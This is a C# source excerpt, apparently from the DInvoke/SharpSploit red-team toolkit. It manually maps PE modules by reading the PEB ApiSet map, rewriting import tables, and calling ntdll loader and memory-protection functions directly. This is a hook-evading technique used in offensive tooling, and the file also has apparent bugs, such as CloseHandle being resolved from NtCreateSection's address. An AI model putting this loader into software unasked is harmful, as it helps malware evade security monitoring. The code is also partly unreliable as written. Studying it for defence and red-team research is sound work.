            Dictionary<string, string> ApiSetDict = new Dictionary<string, string>();

            IntPtr pApiSetNamespace = Marshal.ReadIntPtr((IntPtr)((UInt64)pbi.PebBaseAddress + ApiSetMapOffset));
            STRUCTS.ApiSetNamespace Namespace = (STRUCTS.ApiSetNamespace)Marshal.PtrToStructure(pApiSetNamespace, typeof(STRUCTS.ApiSetNamespace));
            for (var i = 0; i < Namespace.Count; i++)
            {
                STRUCTS.ApiSetNamespaceEntry SetEntry = new STRUCTS.ApiSetNamespaceEntry();

                IntPtr pSetEntry = (IntPtr)((UInt64)pApiSetNamespace + (UInt64)Namespace.EntryOffset + (UInt64)(i * Marshal.SizeOf(SetEntry)));
                SetEntry = (STRUCTS.ApiSetNamespaceEntry)Marshal.PtrToStructure(pSetEntry, typeof(STRUCTS.ApiSetNamespaceEntry));

                string ApiSetEntryName = Marshal.PtrToStringUni((IntPtr)((UInt64)pApiSetNamespace + (UInt64)SetEntry.NameOffset), SetEntry.NameLength / 2);
                string ApiSetEntryKey = ApiSetEntryName.Substring(0, ApiSetEntryName.Length - 2) + ".dll"; // Remove the patch number and add .dll

                STRUCTS.ApiSetValueEntry SetValue = new STRUCTS.ApiSetValueEntry();

                IntPtr pSetValue = IntPtr.Zero;

                // If there is only one host, then use it
                if (SetEntry.ValueLength == 1)
                    pSetValue = (IntPtr)((UInt64)pApiSetNamespace + (UInt64)SetEntry.ValueOffset);
                else if (SetEntry.ValueLength > 1)
                {
                    // Loop through the hosts until we find one that is different from the key, if available
                    for (var j = 0; j < SetEntry.ValueLength; j++)
                    {
                        IntPtr host = (IntPtr)((UInt64)pApiSetNamespace + (UInt64)SetEntry.ValueOffset + (UInt64)Marshal.SizeOf(SetValue) * (UInt64)j);
                        if (Marshal.PtrToStringUni(host) != ApiSetEntryName)
                            pSetValue = (IntPtr)((UInt64)pApiSetNamespace + (UInt64)SetEntry.ValueOffset + (UInt64)Marshal.SizeOf(SetValue) * (UInt64)j);
                    }
                    // If there is not one different from the key, then just use the key and hope that works
                    if (pSetValue == IntPtr.Zero)
                        pSetValue = (IntPtr)((UInt64)pApiSetNamespace + (UInt64)SetEntry.ValueOffset);
                }

                //Get the host DLL's name from the entry
                SetValue = (STRUCTS.ApiSetValueEntry)Marshal.PtrToStructure(pSetValue, typeof(STRUCTS.ApiSetValueEntry));
                string ApiSetValue = string.Empty;
                if (SetValue.ValueCount != 0)
                {
                    IntPtr pValue = (IntPtr)((UInt64)pApiSetNamespace + (UInt64)SetValue.ValueOffset);
                    ApiSetValue = Marshal.PtrToStringUni(pValue, SetValue.ValueCount / 2);
                }

                // Add pair to dict
                ApiSetDict.Add(ApiSetEntryKey, ApiSetValue);
            }

            // Return dict
            return ApiSetDict;
        }
        /// <summary>
        /// Rewrite IAT for manually mapped module.
        /// </summary>
        /// <author>Ruben Boonen (@FuzzySec)</author>
        /// <param name="PEINFO">Module meta data struct (PE.PE_META_DATA).</param>
        /// <param name="ModuleMemoryBase">Base address of the module in memory.</param>
        /// <returns>void</returns>
        public static void RewriteModuleIAT(STRUCTS.PE_META_DATA PEINFO, IntPtr ModuleMemoryBase)
        {
            STRUCTS.IMAGE_DATA_DIRECTORY idd = PEINFO.Is32Bit ? PEINFO.OptHeader32.ImportTable : PEINFO.OptHeader64.ImportTable;

            // Check if there is no import table
            if (idd.VirtualAddress == 0)
            {
                // Return so that the rest of the module mapping process may continue.
                return;
            }

            // Ptr for the base import directory
            IntPtr pImportTable = (IntPtr)((UInt64)ModuleMemoryBase + idd.VirtualAddress);

            // Get API Set mapping dictionary if on Win10+
            STRUCTS.OSVERSIONINFOEX OSVersion = new STRUCTS.OSVERSIONINFOEX();
            IntPtr pointer = Invoke.GetLibraryAddress("Ntdll.dll", "RtlGetVersion");
            DELEGATES.RtlGetVersion RtlGetVersion = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.RtlGetVersion)) as DELEGATES.RtlGetVersion;
            RtlGetVersion(ref OSVersion);
            Dictionary<string, string> ApiSetDict = new Dictionary<string, string>();
            if (OSVersion.MajorVersion >= 10)
            {
                ApiSetDict = GetApiSetMapping();
            }

            // Loop IID's
            int counter = 0;
            STRUCTS.IMAGE_IMPORT_DESCRIPTOR iid = new STRUCTS.IMAGE_IMPORT_DESCRIPTOR();
            iid = (STRUCTS.IMAGE_IMPORT_DESCRIPTOR)Marshal.PtrToStructure(
                (IntPtr)((UInt64)pImportTable + (uint)(Marshal.SizeOf(iid) * counter)),
                typeof(STRUCTS.IMAGE_IMPORT_DESCRIPTOR)
            );
            while (iid.Name != 0)
            {
                // Get DLL
                string DllName = string.Empty;
                try
                {
                    DllName = Marshal.PtrToStringAnsi((IntPtr)((UInt64)ModuleMemoryBase + iid.Name));
                }
                catch { }

                // Loop imports
                if (DllName == string.Empty)
                {
                    throw new InvalidOperationException("Failed to read DLL name.");
                }
                else
                {
                    string LookupKey = DllName.Substring(0, DllName.Length - 6) + ".dll";
                    // API Set DLL? Ignore the patch number.
                    if (OSVersion.MajorVersion >= 10 && (DllName.StartsWith("api-") || DllName.StartsWith("ext-")) &&
                        ApiSetDict.ContainsKey(LookupKey) && ApiSetDict[LookupKey].Length > 0)
                    {
                        // Not all API set DLL's have a registered host mapping
                        DllName = ApiSetDict[LookupKey];
                    }

                    // Check and / or load DLL
                    IntPtr hModule = GetLoadedModuleAddress(DllName);
                    if (hModule == IntPtr.Zero)
                    {
                        hModule = LoadModuleFromDisk(DllName);
                        if (hModule == IntPtr.Zero)
                        {
                            throw new FileNotFoundException(DllName + ", unable to find the specified file.");
                        }
                    }

                    // Loop thunks
                    if (PEINFO.Is32Bit)
                    {
                        STRUCTS.IMAGE_THUNK_DATA32 oft_itd = new STRUCTS.IMAGE_THUNK_DATA32();
                        for (int i = 0; true; i++)
                        {
                            oft_itd = (STRUCTS.IMAGE_THUNK_DATA32)Marshal.PtrToStructure((IntPtr)((UInt64)ModuleMemoryBase + iid.OriginalFirstThunk + (UInt32)(i * (sizeof(UInt32)))), typeof(STRUCTS.IMAGE_THUNK_DATA32));
                            IntPtr ft_itd = (IntPtr)((UInt64)ModuleMemoryBase + iid.FirstThunk + (UInt64)(i * (sizeof(UInt32))));
                            if (oft_itd.AddressOfData == 0)
                            {
                                break;
                            }

                            if (oft_itd.AddressOfData < 0x80000000) // !IMAGE_ORDINAL_FLAG32
                            {
                                IntPtr pImpByName = (IntPtr)((UInt64)ModuleMemoryBase + oft_itd.AddressOfData + sizeof(UInt16));
                                IntPtr pFunc = IntPtr.Zero;
                                pFunc = GetNativeExportAddress(hModule, Marshal.PtrToStringAnsi(pImpByName));

                                // Write ProcAddress
                                Marshal.WriteInt32(ft_itd, pFunc.ToInt32());
                            }
                            else
                            {
                                ulong fOrdinal = oft_itd.AddressOfData & 0xFFFF;
                                IntPtr pFunc = IntPtr.Zero;
                                pFunc = GetNativeExportAddress(hModule, (short)fOrdinal);

                                // Write ProcAddress
                                Marshal.WriteInt32(ft_itd, pFunc.ToInt32());
                            }
                        }
                    }
                    else
                    {
                        STRUCTS.IMAGE_THUNK_DATA64 oft_itd = new STRUCTS.IMAGE_THUNK_DATA64();
                        for (int i = 0; true; i++)
                        {
                            oft_itd = (STRUCTS.IMAGE_THUNK_DATA64)Marshal.PtrToStructure((IntPtr)((UInt64)ModuleMemoryBase + iid.OriginalFirstThunk + (UInt64)(i * (sizeof(UInt64)))), typeof(STRUCTS.IMAGE_THUNK_DATA64));
                            IntPtr ft_itd = (IntPtr)((UInt64)ModuleMemoryBase + iid.FirstThunk + (UInt64)(i * (sizeof(UInt64))));
                            if (oft_itd.AddressOfData == 0)
                            {
                                break;
                            }

                            if (oft_itd.AddressOfData < 0x8000000000000000) // !IMAGE_ORDINAL_FLAG64
                            {
                                IntPtr pImpByName = (IntPtr)((UInt64)ModuleMemoryBase + oft_itd.AddressOfData + sizeof(UInt16));
                                IntPtr pFunc = IntPtr.Zero;
                                pFunc = GetNativeExportAddress(hModule, Marshal.PtrToStringAnsi(pImpByName));

                                // Write pointer
                                Marshal.WriteInt64(ft_itd, pFunc.ToInt64());
                            }
                            else
                            {
                                ulong fOrdinal = oft_itd.AddressOfData & 0xFFFF;
                                IntPtr pFunc = IntPtr.Zero;
                                pFunc = GetNativeExportAddress(hModule, (short)fOrdinal);

                                // Write pointer
                                Marshal.WriteInt64(ft_itd, pFunc.ToInt64());
                            }
                        }
                    }

                    // Go to the next IID
                    counter++;
                    iid = (STRUCTS.IMAGE_IMPORT_DESCRIPTOR)Marshal.PtrToStructure(
                        (IntPtr)((UInt64)pImportTable + (uint)(Marshal.SizeOf(iid) * counter)),
                        typeof(STRUCTS.IMAGE_IMPORT_DESCRIPTOR)
                    );
                }
            }
        }
        public static IntPtr LoadModuleFromDisk(string DLLPath)
        {
            STRUCTS.UNICODE_STRING uModuleName = new STRUCTS.UNICODE_STRING();
            IntPtr pointer = Invoke.GetLibraryAddress("Ntdll.dll", "RtlInitUnicodeString");
            DELEGATES.RtlInitUnicodeString RtlInitUnicodeString = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.RtlInitUnicodeString)) as DELEGATES.RtlInitUnicodeString;
            RtlInitUnicodeString(ref uModuleName, DLLPath);

            IntPtr hModule = IntPtr.Zero;
            pointer = Invoke.GetLibraryAddress("Ntdll.dll", "LdrLoadDll");
            DELEGATES.LdrLoadDll LdrLoadDll = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.LdrLoadDll)) as DELEGATES.LdrLoadDll;
            STRUCTS.NTSTATUS CallResult = LdrLoadDll(IntPtr.Zero, 0, ref uModuleName, ref hModule);
            if (CallResult != STRUCTS.NTSTATUS.Success || hModule == IntPtr.Zero)
            {
                return IntPtr.Zero;
            }

            return hModule;
        }

        public static IntPtr GetNativeExportAddress(IntPtr ModuleBase, string ExportName)
        {
            STRUCTS.ANSI_STRING aFunc = new STRUCTS.ANSI_STRING
            {
                Length = (ushort)ExportName.Length,
                MaximumLength = (ushort)(ExportName.Length + 2),
                Buffer = Marshal.StringToCoTaskMemAnsi(ExportName)
            };

            IntPtr pAFunc = Marshal.AllocHGlobal(Marshal.SizeOf(aFunc));
            Marshal.StructureToPtr(aFunc, pAFunc, true);

            IntPtr pFuncAddr = IntPtr.Zero;
            IntPtr pointer = Invoke.GetLibraryAddress("Ntdll.dll", "LdrGetProcedureAddress");
            DELEGATES.LdrGetProcedureAddress LdrGetProcedureAddress = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.LdrGetProcedureAddress)) as DELEGATES.LdrGetProcedureAddress;
            LdrGetProcedureAddress(ModuleBase, pAFunc, IntPtr.Zero, ref pFuncAddr);

            Marshal.FreeHGlobal(pAFunc);

            return pFuncAddr;
        }
        public static IntPtr GetNativeExportAddress(IntPtr ModuleBase, short Ordinal)
        {
            IntPtr pFuncAddr = IntPtr.Zero;
            IntPtr pOrd = (IntPtr)Ordinal;
            IntPtr pointer = Invoke.GetLibraryAddress("Ntdll.dll", "LdrGetProcedureAddress");
            DELEGATES.LdrGetProcedureAddress LdrGetProcedureAddress = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.LdrGetProcedureAddress)) as DELEGATES.LdrGetProcedureAddress;
            LdrGetProcedureAddress(ModuleBase, IntPtr.Zero, pOrd, ref pFuncAddr);

            return pFuncAddr;
        }
        /// <summary>
        /// Set correct module section permissions.
        /// </summary>
        /// <author>Ruben Boonen (@FuzzySec)</author>
        /// <param name="PEINFO">Module meta data struct (PE.PE_META_DATA).</param>
        /// <param name="ModuleMemoryBase">Base address of the module in memory.</param>
        /// <returns>void</returns>
        public static void SetModuleSectionPermissions(STRUCTS.PE_META_DATA PEINFO, IntPtr ModuleMemoryBase)
        {
            // Apply RO to the module header
            IntPtr BaseOfCode = PEINFO.Is32Bit ? (IntPtr)PEINFO.OptHeader32.BaseOfCode : (IntPtr)PEINFO.OptHeader64.BaseOfCode;
            IntPtr pointer = Invoke.GetLibraryAddress("Ntdll.dll", "NtProtectVirtualMemory");
            DELEGATES.NtProtectVirtualMemory NtProtectVirtualMemory = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.NtProtectVirtualMemory)) as DELEGATES.NtProtectVirtualMemory;
            UInt32 oldpro = 0;
            NtProtectVirtualMemory((IntPtr)(-1), ref ModuleMemoryBase, ref BaseOfCode, (int)STRUCTS.PAGE_READONLY, ref oldpro);

            // Apply section permissions
            foreach (STRUCTS.IMAGE_SECTION_HEADER ish in PEINFO.Sections)
            {
                bool isRead = (ish.Characteristics & STRUCTS.DataSectionFlags.MEM_READ) != 0;
                bool isWrite = (ish.Characteristics & STRUCTS.DataSectionFlags.MEM_WRITE) != 0;
                bool isExecute = (ish.Characteristics & STRUCTS.DataSectionFlags.MEM_EXECUTE) != 0;
                uint flNewProtect = 0;
                if (isRead & !isWrite & !isExecute)
                {
                    flNewProtect = STRUCTS.PAGE_READONLY;
                }
                else if (isRead & isWrite & !isExecute)
                {
                    flNewProtect = STRUCTS.PAGE_READWRITE;
                }
                else if (isRead & isWrite & isExecute)
                {
                    flNewProtect = STRUCTS.PAGE_EXECUTE_READWRITE;
                }
                else if (isRead & !isWrite & isExecute)
                {
                    flNewProtect = STRUCTS.PAGE_EXECUTE_READ;
                }
                else if (!isRead & !isWrite & isExecute)
                {
                    flNewProtect = STRUCTS.PAGE_EXECUTE;
                }
                else
                {
                    throw new InvalidOperationException("Unknown section flag, " + ish.Characteristics);
                }

                // Calculate base
                IntPtr pVirtualSectionBase = (IntPtr)((UInt64)ModuleMemoryBase + ish.VirtualAddress);
                IntPtr ProtectSize = (IntPtr)ish.VirtualSize;

                // Set protection
                NtProtectVirtualMemory((IntPtr)(-1), ref pVirtualSectionBase, ref ProtectSize, flNewProtect, ref oldpro);
            }
        }
        public static IntPtr AllocateBytesToMemory(byte[] FileByteArray)
        {
            IntPtr pFile = Marshal.AllocHGlobal(FileByteArray.Length);
            Marshal.Copy(FileByteArray, 0, pFile, FileByteArray.Length);
            return pFile;
        }
        public static bool FileHasValidSignature(string FilePath)
        {
            X509Certificate2 FileCertificate;
            try
            {
                X509Certificate signer = X509Certificate.CreateFromSignedFile(FilePath);
                FileCertificate = new X509Certificate2(signer);
            }
            catch
            {
                return false;
            }

            X509Chain CertificateChain = new X509Chain();
            CertificateChain.ChainPolicy.RevocationFlag = X509RevocationFlag.EntireChain;
            CertificateChain.ChainPolicy.RevocationMode = X509RevocationMode.Offline;
            CertificateChain.ChainPolicy.VerificationFlags = X509VerificationFlags.NoFlag;

            return CertificateChain.Build(FileCertificate);
        }
        /// <summary>
        /// Maps a DLL from disk into a Section using NtCreateSection.
        /// </summary>
        /// <author>The Wover (@TheRealWover), Ruben Boonen (@FuzzySec)</author>
        /// <param name="DLLPath">Full path fo the DLL on disk.</param>
        /// <returns>PE.PE_MANUAL_MAP</returns>
        public static STRUCTS.PE_MANUAL_MAP MapModuleFromDiskToSection(string DLLPath)
        {
            // Check file exists
            if (!File.Exists(DLLPath))
            {
                throw new InvalidOperationException("Filepath not found.");
            }

            // Open file handle
            STRUCTS.UNICODE_STRING ObjectName = new STRUCTS.UNICODE_STRING();
            IntPtr pointer = Invoke.GetLibraryAddress("Ntdll.dll", "RtlInitUnicodeString");
            DELEGATES.RtlInitUnicodeString RtlInitUnicodeString = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.RtlInitUnicodeString)) as DELEGATES.RtlInitUnicodeString;
            RtlInitUnicodeString(ref ObjectName, (@"\??\" + DLLPath));
            IntPtr pObjectName = Marshal.AllocHGlobal(Marshal.SizeOf(ObjectName));
            Marshal.StructureToPtr(ObjectName, pObjectName, true);

            STRUCTS.OBJECT_ATTRIBUTES objectAttributes = new STRUCTS.OBJECT_ATTRIBUTES();
            objectAttributes.Length = Marshal.SizeOf(objectAttributes);
            objectAttributes.ObjectName = pObjectName;
            objectAttributes.Attributes = 0x40; // OBJ_CASE_INSENSITIVE

            STRUCTS.IO_STATUS_BLOCK ioStatusBlock = new STRUCTS.IO_STATUS_BLOCK();

            IntPtr hFile = IntPtr.Zero;
            pointer = Invoke.GetLibraryAddress("Ntdll.dll", "NtOpenFile");
            DELEGATES.NtOpenFile NtOpenFile = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.NtOpenFile)) as DELEGATES.NtOpenFile;
            NtOpenFile(
                ref hFile,
                STRUCTS.FileAccessFlags.FILE_READ_DATA |
                STRUCTS.FileAccessFlags.FILE_EXECUTE |
                STRUCTS.FileAccessFlags.FILE_READ_ATTRIBUTES |
                STRUCTS.FileAccessFlags.SYNCHRONIZE,
                ref objectAttributes, ref ioStatusBlock,
                STRUCTS.FileShareFlags.FILE_SHARE_READ |
                STRUCTS.FileShareFlags.FILE_SHARE_DELETE,
                STRUCTS.FileOpenFlags.FILE_SYNCHRONOUS_IO_NONALERT |
                STRUCTS.FileOpenFlags.FILE_NON_DIRECTORY_FILE
            );

            // Create section from hFile
            IntPtr hSection = IntPtr.Zero;
            ulong MaxSize = 0;
            pointer = Invoke.GetLibraryAddress("Ntdll.dll", "NtCreateSection");
            DELEGATES.NtCreateSection NtCreateSection = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.NtCreateSection)) as DELEGATES.NtCreateSection;
            UInt32 ret = NtCreateSection(
                ref hSection,
                (UInt32)STRUCTS.ACCESS_MASK.SECTION_ALL_ACCESS,
                IntPtr.Zero,
                ref MaxSize,
                STRUCTS.PAGE_READONLY,
                STRUCTS.SEC_IMAGE,
                hFile
            );

            // Map view of file
            IntPtr pBaseAddress = IntPtr.Zero;
            pointer = Invoke.GetLibraryAddress("Ntdll.dll", "NtMapViewOfSection");
            DELEGATES.NtMapViewOfSection NtMapViewOfSection = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.NtMapViewOfSection)) as DELEGATES.NtMapViewOfSection;
            NtMapViewOfSection(
                hSection, (IntPtr)(-1), out pBaseAddress,
                IntPtr.Zero, IntPtr.Zero, IntPtr.Zero,
                out MaxSize, 0x2, 0x0,
                STRUCTS.PAGE_READWRITE
            );

            // Prepare return object
            STRUCTS.PE_MANUAL_MAP SecMapObject = new STRUCTS.PE_MANUAL_MAP
            {
                PEINFO = GetPeMetaData(pBaseAddress),
                ModuleBase = pBaseAddress
            };
            pointer = Invoke.GetLibraryAddress("Ntdll.dll", "NtCreateSection");
            DELEGATES.CloseHandle CloseHandle = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.CloseHandle)) as DELEGATES.CloseHandle;
            CloseHandle(hFile);

            return SecMapObject;
        }
        public static STRUCTS.PE_META_DATA GetPeMetaData(IntPtr pModule)
        {
            STRUCTS.PE_META_DATA PeMetaData = new STRUCTS.PE_META_DATA();
            try
            {
                UInt32 e_lfanew = (UInt32)Marshal.ReadInt32((IntPtr)((UInt64)pModule + 0x3c));
                PeMetaData.Pe = (UInt32)Marshal.ReadInt32((IntPtr)((UInt64)pModule + e_lfanew));
                // Validate PE signature
                if (PeMetaData.Pe != 0x4550)
                {
                    throw new InvalidOperationException("Invalid PE signature.");
                }
                PeMetaData.ImageFileHeader = (STRUCTS.IMAGE_FILE_HEADER)Marshal.PtrToStructure((IntPtr)((UInt64)pModule + e_lfanew + 0x4), typeof(STRUCTS.IMAGE_FILE_HEADER));
                IntPtr OptHeader = (IntPtr)((UInt64)pModule + e_lfanew + 0x18);
                UInt16 PEArch = (UInt16)Marshal.ReadInt16(OptHeader);
                // Validate PE arch
                if (PEArch == 0x010b) // Image is x32
                {
                    PeMetaData.Is32Bit = true;
                    PeMetaData.OptHeader32 = (STRUCTS.IMAGE_OPTIONAL_HEADER32)Marshal.PtrToStructure(OptHeader, typeof(STRUCTS.IMAGE_OPTIONAL_HEADER32));
                }
                else if (PEArch == 0x020b) // Image is x64
                {
                    PeMetaData.Is32Bit = false;
                    PeMetaData.OptHeader64 = (STRUCTS.IMAGE_OPTIONAL_HEADER64)Marshal.PtrToStructure(OptHeader, typeof(STRUCTS.IMAGE_OPTIONAL_HEADER64));
                }
                else
                {
                    throw new InvalidOperationException("Invalid magic value (PE32/PE32+).");
                }
                // Read sections
                STRUCTS.IMAGE_SECTION_HEADER[] SectionArray = new STRUCTS.IMAGE_SECTION_HEADER[PeMetaData.ImageFileHeader.NumberOfSections];
                for (int i = 0; i < PeMetaData.ImageFileHeader.NumberOfSections; i++)
                {
                    IntPtr SectionPtr = (IntPtr)((UInt64)OptHeader + PeMetaData.ImageFileHeader.SizeOfOptionalHeader + (UInt32)(i * 0x28));
                    SectionArray[i] = (STRUCTS.IMAGE_SECTION_HEADER)Marshal.PtrToStructure(SectionPtr, typeof(STRUCTS.IMAGE_SECTION_HEADER));
                }
                Console.WriteLine(SectionArray[0].Name);
                Console.WriteLine(SectionArray[0].VirtualAddress);
                Console.WriteLine(SectionArray[0].VirtualSize);

                PeMetaData.Sections = SectionArray;
            }
            catch
            {
                throw new InvalidOperationException("Invalid module base specified.");
            }
            return PeMetaData;
        }
    }
}
